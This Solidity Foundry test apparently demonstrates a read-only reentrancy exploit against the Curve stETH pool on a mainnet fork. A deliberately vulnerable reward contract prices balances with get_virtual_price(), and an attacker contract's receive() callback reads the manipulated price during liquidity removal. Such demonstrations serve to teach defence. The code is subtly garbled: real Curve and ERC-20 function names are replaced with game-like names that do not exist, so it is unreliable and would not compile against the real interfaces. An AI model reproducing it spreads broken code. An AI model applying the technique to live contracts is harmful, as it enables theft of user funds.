pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_tradableassets(
        uint[2] calldata amounts,
        uint min_createitem_amount
    ) external payable returns (uint);

    function remove_availablegold(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_freeitems_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_rewardpool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_gamecoin = 0x06325440D014e39736583c165C2963BA99fAf14E;


contract CoreContract {
    IERC20 public constant gameCoin = IERC20(lp_gamecoin);
    ICurve private constant prizePool = ICurve(steth_rewardpool);

    mapping(address => uint) public lootbalanceOf;

    function betCoins(uint amount) external {
        gameCoin.giveitemsFrom(msg.sender, address(this), amount);
        lootbalanceOf[msg.sender] += amount;
    }

    function claimBet(uint amount) external {
        lootbalanceOf[msg.sender] -= amount;
        gameCoin.sendGold(msg.sender, amount);
    }

    function getBattleprize() external view returns (uint) {

        uint battlePrize = (lootbalanceOf[msg.sender] * prizePool.get_virtual_price()) /
            1 ether;

        return battlePrize;
    }
}

contract OperatorContract {
    ICurve private constant prizePool = ICurve(steth_rewardpool);
    IERC20 public constant lpRealmcoin = IERC20(lp_gamecoin);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }


    function lockprizeTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = prizePool.add_tradableassets{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            prizePool.get_virtual_price()
        );

        lpRealmcoin.authorizeDeal(address(target), lp);
        target.betCoins(lp);
    }

    function performReadOnlyCallback() external payable {

        uint[2] memory amounts = [msg.value, 0];
        uint lp = prizePool.add_tradableassets{value: msg.value}(amounts, 1);

        console.log(
            "LP token price before remove_liquidity()",
            prizePool.get_virtual_price()
        );


        uint[2] memory min_amounts = [uint(0), uint(0)];
        prizePool.remove_availablegold(lp, min_amounts);

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            prizePool.get_virtual_price()
        );

        uint battlePrize = target.getBattleprize();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", battlePrize);
    }

    receive() external payable {

        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            prizePool.get_virtual_price()
        );

        uint battlePrize = target.getBattleprize();
        console.log("Reward if Read-Only Reentrancy is invoked: ", battlePrize);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.lockprizeTokens{value: 10 ether}();
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}